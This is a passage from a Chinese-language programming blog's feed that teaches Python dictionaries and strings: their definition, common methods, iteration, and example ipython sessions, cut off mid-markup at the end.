        <content type="html"><![CDATA[<h2 id="定义">定义</h2><p><code>dictionary</code> （字典） 是 <strong>除列表以外</strong><code>Python</code> 之中 <strong>最灵活</strong> 的数据类型,字典通常用于存储 <strong>描述一个 <code>物体</code>的相关信息</strong></p><p>字典和列表的区别</p><pre><code>- **列表** 是 **有序** 的对象集合- **字典** 是 **无序** 的对象集合</code></pre><ul><li><p>字典用 <code>&#123;&#125;</code> 定义</p></li><li><p>字典使用 <strong>键值对</strong> 存储数据，键值对之间使用<code>,</code> 分隔</p><ul><li><strong>键</strong> <code>key</code> 是索引</li><li><strong>值</strong> <code>value</code> 是数据</li><li><strong>键</strong> 和 <strong>值</strong> 之间使用 <code>:</code>分隔</li><li><strong>键必须是唯一的</strong></li><li><strong>值</strong> 可以取任何数据类型，但 <strong>键</strong>只能使用 <strong>字符串</strong>、<strong>数字</strong>或<strong>元组</strong>, 因为字典的值要求是可 hash的，因此需要是不可变类型。</li></ul></li></ul><p>注意:初始化字典的键值时，一般每行一个键值对(如下面例子格式)，这样更加清晰。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xiaoming = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;小明&quot;</span>,</span><br><span class="line">            <span class="string">&quot;age&quot;</span>: <span class="number">18</span>,</span><br><span class="line">            <span class="string">&quot;gender&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&quot;height&quot;</span>: <span class="number">1.75</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="常用操作">常用操作</h2><ul><li>在 <code>ipython3</code> 中定义一个 <strong>字典</strong>，例如：<code>xiaoming = &#123;&#125;</code></li><li>输入 <code>xiaoming.</code> 按下 <code>TAB</code> 键，<code>ipython</code> 会提示 <strong>字典</strong>能够使用的函数如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: xiaoming.</span><br><span class="line">xiaoming.clear       xiaoming.items       xiaoming.setdefault</span><br><span class="line">xiaoming.copy        xiaoming.keys        xiaoming.update</span><br><span class="line">xiaoming.fromkeys    xiaoming.pop         xiaoming.values</span><br><span class="line">xiaoming.get         xiaoming.popitem</span><br></pre></td></tr></table></figure><p><code>len(dict)</code> 获取字典键值对数量 <code>dict.keys()</code>所有 key 的列表 <code>dict.values()</code> 所有 values 列表<code>dict.items()</code> 所有 (key, values) 元组列表<code>dict.update(temp_dict)</code> 合并字典注意：如果被合并的字典中包含已存在的键，则新合并来的值会覆盖原值。<code>dict.clear()</code> 清空字典</p><h2 id="增删改查">增删改查</h2><ol type="1"><li><p>查询，直接查询 <code>dict[key值]</code> 即可</p><p>判断 key 是否存在:</p><ol type="1"><li><code>dict[key值]</code>, key 不存在，会抛出 <code>KeyError</code>错误。</li><li><code>dict.get(key值)</code>，key 不存在。get 函数返回空None，但不会出错。</li></ol><p>注：查找 value ， 使用 <code>dict["name"] == "zhangsan"</code>获取比较即可。</p></li></ol><ul><li><p>增加/删除，如果 key 不存在， 会新增键值对，如果 key存在，会修改已经存在的键值对。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">perinfo = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>&#125;</span><br><span class="line">perinfo[<span class="string">&quot;age&quot;</span>] = <span class="number">18</span></span><br><span class="line"><span class="built_in">print</span>(perinfo[<span class="string">&quot;age&quot;</span>])</span><br></pre></td></tr></table></figure></li><li><p>删除，使用 <code>pop(key值)</code> 删除</p></li><li><p>增加，直接写要增加的 key ，values 即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">perinfo = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>&#125;</span><br><span class="line">perinfo[<span class="string">&quot;age&quot;</span>] = <span class="number">18</span></span><br><span class="line">perinfo.pop(<span class="string">&quot;age&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(perinfo)</span><br></pre></td></tr></table></figure><p>注意: 如果要删除的 key 值不存在，也会报 KeyError 错误</p></li></ul><h2 id="循环遍历">循环遍历</h2><ul><li><strong>遍历</strong> 就是 <strong>依次</strong> 从<strong>字典</strong> 中获取所有键值对</li></ul><p>三种需求：</p><ol type="1"><li><p>从字典中遍历键</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">19</span>]: dic</span><br><span class="line">Out[<span class="number">19</span>]: &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Jon&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;male&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">16</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">    ...:     <span class="built_in">print</span>(i)</span><br><span class="line">    ...:</span><br><span class="line">name</span><br><span class="line">age</span><br><span class="line">gender</span><br></pre></td></tr></table></figure></p></li><li><p>从字典中遍历值</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">方法 <span class="number">1</span>：推荐</span><br><span class="line"></span><br><span class="line">In [<span class="number">23</span>]: <span class="keyword">for</span> value <span class="keyword">in</span> dic.values():</span><br><span class="line">   ...:     <span class="built_in">print</span>(value)</span><br><span class="line">   ...:</span><br><span class="line">Jon</span><br><span class="line"><span class="number">16</span></span><br><span class="line">male</span><br><span class="line"></span><br><span class="line">方法 <span class="number">2</span>：</span><br><span class="line"></span><br><span class="line">In [<span class="number">21</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">   ...:     <span class="built_in">print</span>(dic[i])</span><br><span class="line">Jon</span><br><span class="line"><span class="number">16</span></span><br><span class="line">male</span><br></pre></td></tr></table></figure></p></li><li><p>从字典中遍历键值对</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">方法 <span class="number">1</span>： 推荐</span><br><span class="line"></span><br><span class="line">In [<span class="number">24</span>]: <span class="keyword">for</span> item <span class="keyword">in</span> dic.items():</span><br><span class="line">    ...:     <span class="built_in">print</span>(item)</span><br><span class="line">    ...:(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;Jon&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;age&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">(<span class="string">&#x27;gender&#x27;</span>, <span class="string">&#x27;male&#x27;</span>)</span><br><span class="line"></span><br><span class="line">方法 <span class="number">2</span>：</span><br><span class="line"></span><br><span class="line"><span class="comment"># for 循环内部使用的 `key 的变量` in 字典</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> xiaoming:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s: %s&quot;</span> % (k, xiaoming[k]))</span><br></pre></td></tr></table></figure></p></li></ol><blockquote><p>提示：在实际开发中，由于字典中每一个键值对保存数据的类型是不同的，所以针对字典的循环遍历需求并不是很多</p></blockquote><h2 id="应用场景">应用场景</h2><ul><li>尽管可以使用 <code>for in</code> 遍历 <strong>字典</strong></li><li>但是在开发中，更多的应用场景是：<ul><li>使用 <strong>多个键值对</strong>，存储 <strong>描述一个<code>物体</code> 的相关信息</strong> —— 描述更复杂的数据信息</li><li>将 <strong>多个字典</strong> 放在 <strong>一个列表</strong>中，再进行遍历，在循环体内部针对每一个字典进行<strong>相同的处理</strong></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">card_list = [&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;张三&quot;</span>,</span><br><span class="line">              <span class="string">&quot;qq&quot;</span>: <span class="string">&quot;12345&quot;</span>,</span><br><span class="line">              <span class="string">&quot;phone&quot;</span>: <span class="string">&quot;110&quot;</span>&#125;,</span><br><span class="line">             &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;李四&quot;</span>,</span><br><span class="line">              <span class="string">&quot;qq&quot;</span>: <span class="string">&quot;54321&quot;</span>,</span><br><span class="line">              <span class="string">&quot;phone&quot;</span>: <span class="string">&quot;10086&quot;</span>&#125;</span><br><span class="line">             ]</span><br></pre></td></tr></table></figure><h2 id="常见算法">常见算法</h2><h3 id="查找两字典的相同点">查找两字典的相同点</h3><p>如何在两个字典中寻找相同点（比如: 相同的键、相同的值等）？</p><p>知识点: <code>dict_keys</code>, <code>dict_items</code>支持基本的集合操作， 并集 <code>|</code>， 交集 <code>&amp;</code>，差集 <code>-</code>， 对称差集 <code>^</code>。 注：<code>dict_values</code>不支持集合运算，是因为字典的值可重复，不一定是唯一的，这样会导致某些集合的操作出现问题。示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a.keys() &amp; b.keys()</span><br><span class="line">a.keys() | b.keys()</span><br><span class="line">a.keys() - b.keys()</span><br><span class="line">a.items() ^ b.items()</span><br></pre></td></tr></table></figure><h2 id="修改或者过滤字典元素">修改或者过滤字典元素</h2><p>以现有字典构造一个排除几个指定键的新字典。下面利用字典推导来实现这样的需求：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## make a new dict with certain keys removed</span></span><br><span class="line">c = &#123;key:a[key] <span class="keyword">for</span> key <span class="keyword">in</span> a.keys() - &#123;<span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;name&#x27;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> collections </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 字符串</title>
      <link href="/blog/2020/03/21/programming/python/1.basic/3.string/"/>
      <url>/blog/2020/03/21/programming/python/1.basic/3.string/</url>
      
        <content type="html"><![CDATA[<h2 id="字符串的定义">字符串的定义</h2><ul><li><strong>字符串</strong> 是 <strong>一串字符</strong>，也是<code>collection of character</code> ,因此，和列表、元组、字典有许多相同的方法特性。</li><li>在 Python 中可以使用 <strong>一对双引号</strong> <code>"</code> 或者<strong>一对单引号</strong> <code>'</code> 定义一个字符串<ul><li>虽然可以使用 <code>\"</code> 或者 <code>\'</code>做字符串的转义，但是在实际开发中：<ul><li>如果字符串内部需要使用 <code>"</code> ，可以使用 <code>'</code>定义字符串</li><li>如果字符串内部需要使用 <code>'</code> ，可以使用 <code>"</code>定义字符串</li></ul></li></ul></li><li>可以使用 <strong>索引</strong> 获取一个字符串中<strong>指定位置的字符</strong>，索引计数从 <strong>0</strong> 开始</li><li>也可以使用 <code>for</code> <strong>循环遍历</strong>字符串中每一个字符</li></ul><blockquote><p>大多数编程语言都是用 <code>"</code> 来定义字符串</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string = <span class="string">&quot;Hello Python&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> string:</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><h2 id="字符串的常用操作">字符串的常用操作</h2><ul><li>在 <code>ipython3</code> 中定义一个 <strong>字符串</strong>，例如：<code>hello_str = ""</code></li><li>输入 <code>hello_str.</code> 按下 <code>TAB</code> 键，<code>ipython</code> 会提示 <strong>字符串</strong> 能够使用的<strong>方法</strong> 如下：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [1]: hello_str.</span><br><span class="line">hello_str.capitalize    hello_str.isidentifier  hello_str.rindex</span><br><span class="line">hello_str.casefold      hello_str.islower       hello_str.rjust</span><br><span class="line">hello_str.center        hello_str.isnumeric     hello_str.rpartition</span><br><span class="line">hello_str.count         hello_str.isprintable   hello_str.rsplit</span><br><span class="line">hello_str.encode        hello_str.isspace       hello_str.rstrip</span><br><span class="line">hello_str.endswith      hello_str.istitle       hello_str.split</span><br><span class="line">hello_str.expandtabs    hello_str.isupper       hello_str.splitlines</span><br><span class="line">hello_str.find          hello_str.join          hello_str.startswith</span><br><span class="line">hello_str.format        hello_str.ljust         hello_str.strip</span><br><span class="line">hello_str.format_map    hello_str.lower         hello_str.swapcase</span><br><span class="line">hello_str.index         hello_str.lstrip        hello_str.title</span><br><span class="line">hello_str.isalnum       hello_str.maketrans     hello_str.translate</span><br><span class="line">hello_str.isalpha       hello_str.partition     hello_str.upper</span><br><span class="line">hello_str.isdecimal     hello_str.replace       hello_str.zfill</span><br><span class="line">hello_str.isdigit       hello_str.rfind</span><br></pre></td></tr></table></figure><blockquote><p>提示：正是因为 python内置提供的方法足够多，才使得在开发时，能够针对字符串进行更加灵活的操作！应对更多的开发需求！</p></blockquote><h3 id="字符串拼接">0) 字符串拼接</h3><p>python 中进行字符串拼接，极其简单。 使用 <code>+</code>连接两个字符串即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">5</span>]: test = <span class="string">&quot;hello&quot;</span>+<span class="string">&quot;world&quot;</span></span><br><span class="line">In [<span class="number">6</span>]: test</span><br><span class="line">Out[<span class="number">6</span>]: <span class="string">&#x27;helloworld&#x27;</span></span><br></pre></td></tr></table></figure><p>甚至直接去掉 <code>+</code> , 直接 whitespace 也可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">7</span>]: test = <span class="string">&quot;hello&quot;</span> <span class="string">&quot;world&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: test</span><br><span class="line">Out[<span class="number">8</span>]: <span class="string">&#x27;helloworld&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: test = (</span><br><span class="line">    ...:     <span class="string">&quot;www&quot;</span></span><br><span class="line">    ...:     <span class="string">&quot;.&quot;</span></span><br><span class="line">    ...:     <span class="string">&quot;google&quot;</span></span><br><span class="line">    ...:     <span class="string">&quot;.&quot;</span></span><br><span class="line">    ...:     <span class="string">&quot;com&quot;</span></span><br><span class="line">    ...:     )</span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: test</span><br><span class="line">Out[<span class="number">11</span>]: <span class="string">&#x27;www.google.com&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="判断类型---9">1) 判断类型 - 9</h3><table><colgroup><col style="width: 15%" /><col style="width: 84%" /></colgroup><thead><tr class="header"><th>方法</th><th>说明</th></tr></thead><tbody><tr class="odd"><td>string.isspace()</td><td>如果 string 中只包含 whitespace，则返回 True</td></tr><tr class="even"><td>string.isalnum()</td><td>如果 string 至少有一个字符并且所有字符都是字母或数字则返回 True</td></tr><tr class="odd"><td>string.isalpha()</td><td>如果 string 至少有一个字符并且所有字符都是字母则返回 True</td></tr><tr class="even"><td>string.isdecimal()</td><td>如果 string 只包含数字则返回 True， <code>全角数字</code></td></tr><tr class="odd"><td>string.isdigit()</td><td>如果 string 只包含数字则返回 True， <code>全角数字</code> 、<code>⑴</code> 、 <code>\u00b2</code> (注: 第二个是 unicode 字符串)</td></tr><tr class="even"><td>string.isnumeric()</td><td>如果 string 只包含数字则返回 True， <code>全角数字</code> ，<code>汉字数字</code></td></tr><tr class="odd"><td>string.istitle()</td><td>如果 string 是标题化的(每个单词的首字母大写)则返回 True</td></tr><tr class="even"><td>string.islower()</td><td>如果 string中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是小写，则返回True</td></tr><tr class="odd"><td>string.isupper()</td><td>如果 string中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是大写，则返回True</td></tr></tbody></table><p><strong>string.islower()</strong> This method checks if all thecharacters of a string are lowercase characters (a-z).只检查字符串中的英文字母，如果有其它数字或字符不受影响。string.isupper() 与它类似。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">51</span>]: test = <span class="string">&quot;adh13()12#&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">52</span>]: test.islower()</span><br><span class="line">Out[<span class="number">52</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">53</span>]: test = <span class="string">&quot;adH13()12#&quot;</span></span><br><span class="line">In [<span class="number">54</span>]: test.islower()</span><br><span class="line">Out[<span class="number">54</span>]: <span class="literal">False</span></span><br></pre></td></tr></table></figure><p><strong>string.isspace()</strong> 判断字符串是否只包含whitespaces(包含：空格， 制表符 换行符， 回车 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">63</span>]: test_str=<span class="string">&quot;\t\n\r &quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">64</span>]: test_str.isspace()</span><br><span class="line">Out[<span class="number">64</span>]: <span class="literal">True</span></span><br></pre></td></tr></table></figure><p><strong>string.isdecimal string.isdigit string.isnumeric</strong>这三种都不能判断小数。开发中由于常常只针对整型数字，因此常用<code>isdecimal</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">65</span>]: num_str = <span class="string">&quot;一千零一&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">66</span>]: <span class="keyword">def</span> <span class="title function_">print_num</span>(<span class="params">num_str</span>):</span><br><span class="line">    ...:     <span class="built_in">print</span>(num_str)</span><br><span class="line">    ...:     <span class="built_in">print</span>(num_str.isdecimal())</span><br><span class="line">    ...:     <span class="built_in">print</span>(num_str.isdigit())</span><br><span class="line">    ...:     <span class="built_in">print</span>(num_str.isnumeric())</span><br><span class="line"></span><br><span class="line">In [<span class="number">68</span>]: print_num(num_str)</span><br><span class="line">一千零一</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="查找和替换---7">2) 查找和替换 - 7</h3><table><colgroup><col style="width: 30%" /><col style="width: 69%" /></colgroup><thead><tr class="header"><th>方法</th><th>说明</th></tr></thead><tbody><tr class="odd"><td>string.startswith(str)</td><td>检查字符串是否是以 str 开头，是则返回 True</td></tr><tr class="even"><td>string.endswith(str)</td><td>检查字符串是否是以 str 结束，是则返回 True</td></tr><tr class="odd"><td>string.find(str, start=0, end=len(string))</td><td>检测 str 是否包含在 string 中，如果 start 和 end指定范围，则检查是否包含在指定范围内，如果是返回开始的索引值，否则返回<code>-1</code></td></tr><tr class="even"><td>string.rfind(str, start=0, end=len(string))</td><td>类似于 find()，不过是从右边开始查找</td></tr><tr class="odd"><td>string.index(str, start=0, end=len(string))</td><td>跟 find() 方法类似，不过如果 str 不在 string ，会<strong>抛出异常</strong></td></tr><tr class="even"><td>string.rindex(str, start=0, end=len(string))</td><td>类似于 index()，不过是从右边开始</td></tr><tr class="odd"><td>string.replace(old_str, new_str, num=string.count(old))</td><td>把 string 中的 old_str 替换成 new_str，如果 num 指定，则替换不超过num 次</td></tr></tbody></table><h3 id="大小写转换---5">3) 大小写转换 - 5</h3><table><thead><tr class="header"><th>方法</th><th>说明</th></tr></thead><tbody><tr class="odd"><td>string.capitalize()</td><td>把字符串的第一个字符大写</td></tr><tr class="even"><td>string.title()</td><td>把字符串的每个单词首字母大写</td></tr><tr class="odd"><td>string.lower()</td><td>转换 string 中所有大写字符为小写</td></tr><tr class="even"><td>string.upper()</td><td>转换 string 中的小写字母为大写</td></tr><tr class="odd"><td>string.swapcase()</td><td>翻转 string 中的大小写</td></tr></tbody></table><p><strong>upper() 和 lower()</strong></p><p>大小写转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=<span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.upper()</span><br><span class="line"><span class="string">&#x27;HELLO&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;hello&#x27;</span>.upper()</span><br><span class="line"><span class="string">&#x27;HELLO&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>string.capitalize() 与 string.title() 区别</strong></p><p><strong>string.capitalize()</strong> <strong>capitalize()</strong>method converts the first character of a string to capital<strong>(uppercase)</strong> letter. 大写的是整个字符串的第一个字符。如果字符串第一个字符不是英文字母或者是大写的英文字母，那直接返回原字符串的一份copy</p><p><strong>string.title()</strong> 就像文章的 title一样，大写的是字符串中的每一个 word， 并且会把 number 或 symbol后面的第一个字符也大写。 The title() method returns a string where thefirst character in every word is upper case. Like a header, or atitle.</p><p>If the word contains a number or a symbol, the first letter afterthat will be converted to upper case.</p><p>题目: <ahref="https://www.hackerrank.com/challenges/capitalize/problem">Capitalize!</a></p><ol type="1"><li>capitalize 和 title 方法的区别</li><li>python 还有一个 string 模块有个 string.capwords方法可以直接实现题目的要求。</li><li>写代码要尽可能精确，比如: 本题目说 word 之间是 spaces，而不一定是一个 space， 因此，在 split 的时候，使用 split(" ")保留空格，比直接 split() 更加符合要求。</li></ol><h3 id="文本对齐---3">4) 文本对齐 - 3</h3><table><colgroup><col style="width: 24%" /><col style="width: 75%" /></colgroup><thead><tr class="header"><th>方法</th><th>说明</th></tr></thead><tbody><tr class="odd"><td>string.ljust(width)</td><td>返回一个原字符串左对齐，并使用空格填充至长度 width 的新字符串</td></tr><tr class="even"><td>string.rjust(width)</td><td>返回一个原字符串右对齐，并使用空格填充至长度 width 的新字符串</td></tr><tr class="odd"><td>string.center(width)</td><td>返回一个原字符串居中，并使用空格填充至长度 width 的新字符串</td></tr></tbody></table><p><strong>center</strong></p><ol type="1"><li><p>Syntax</p><p><em>string</em>.center(<em>length, character</em>)</p></li><li><p>Parameter Values</p><table><colgroup><col style="width: 11%" /><col style="width: 88%" /></colgroup><thead><tr class="header"><th style="text-align: left;">Parameter</th><th style="text-align: left;">Description</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;"><em>length</em></td><td style="text-align: left;">Required. The length of the returnedstring</td></tr><tr class="even"><td style="text-align: left;"><em>character</em></td><td style="text-align: left;">Optional. The character to fill themissing space on each side. Default is " " (space)</td></tr></tbody></table></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">    &gt;&gt;&gt; <span class="built_in">print</span>(<span class="string">&#x27; Welcome to InfoGath &#x27;</span>.center(<span class="number">35</span>,<span class="string">&#x27;*&#x27;</span>))</span><br><span class="line">    ******* Welcome to InfoGath *******</span><br><span class="line">    &gt;&gt;&gt; <span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27; Welcome to InfoGath &#x27;</span>.center(<span class="number">35</span>,<span class="string">&#x27;*&#x27;</span>)))</span><br><span class="line">    <span class="number">35</span></span><br><span class="line">    ```</span><br><span class="line"></span><br><span class="line"><span class="comment">### 5) 去除空白字符 - 3</span></span><br><span class="line"></span><br><span class="line">| 方法            | 说明                               |</span><br><span class="line">| --------------- | ---------------------------------- |</span><br><span class="line">| string.lstrip() | 截掉 string 左边（开始）的空白字符 |</span><br><span class="line">| string.rstrip() | 截掉 string 右边（末尾）的空白字符 |</span><br><span class="line">| string.strip()  | 截掉 string 左右两边的空白字符     |</span><br><span class="line"></span><br><span class="line">**strip(character) **</span><br><span class="line"></span><br><span class="line">指定取出字符串首尾的 characters</span><br><span class="line"></span><br><span class="line">去除字符串**头尾**（内部的不能去掉，只能先把尾部的去掉，然后内部成为尾部，才能再去掉它）**指定的字符**可以是多个（无序，只要是头尾就行），如果不指定，默认为空格，回车，换行等 whitespaces</span><br><span class="line"></span><br><span class="line">``` python</span><br><span class="line">In [<span class="number">46</span>]: web</span><br><span class="line">Out[<span class="number">46</span>]: <span class="string">&#x27;baidu \tb\n&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">47</span>]: web.strip(<span class="string">&quot;b\t&quot;</span>)</span><br><span class="line">Out[<span class="number">47</span>]: <span class="string">&#x27;aidu \tb\n&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">48</span>]: web.strip(<span class="string">&quot; b\t\n&quot;</span>)</span><br><span class="line">Out[<span class="number">48</span>]: <span class="string">&#x27;aidu&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="拆分和连接---5">6) 拆分和连接 - 5</h3><table><colgroup><col style="width: 18%" /><col style="width: 81%" /></colgroup><thead><tr class="header"><th>方法</th><th>说明</th></tr></thead><tbody><tr class="odd"><td>string.partition(str)</td><td>把字符串 string 分成一个 3 元素的元组 (str 前面, str, str 后面)</td></tr><tr class="even"><td>string.rpartition(str)</td><td>类似于 partition() 方法，不过是从右边开始查找</td></tr><tr class="odd"><td>string.split(str="", num)</td><td>以 str 为分隔符拆分 string，如果 num 有指定值，则仅分隔 num + 1个子字符串，str 默认包含 ', ', '' 和空格</td></tr><tr class="even"><td>string.splitlines()</td><td>按照行(', '', '')分隔，返回一个包含各行作为元素的列表</td></tr><tr class="odd"><td>string.join(seq)</td><td>以 string 作为分隔符，将 seq中所有的元素（的字符串表示）合并为一个新的字符串</td></tr></tbody></table><p><strong>string.split(str="", num)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>c=<span class="string">&#x27;I love python&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> c.split(sep=<span class="string">&#x27; &#x27;</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>&#x27;</span>,end=<span class="string">&#x27;_&#x27;</span>))</span><br><span class="line">...</span><br><span class="line">I_love_python_&gt;&gt;&gt;</span><br><span class="line"><span 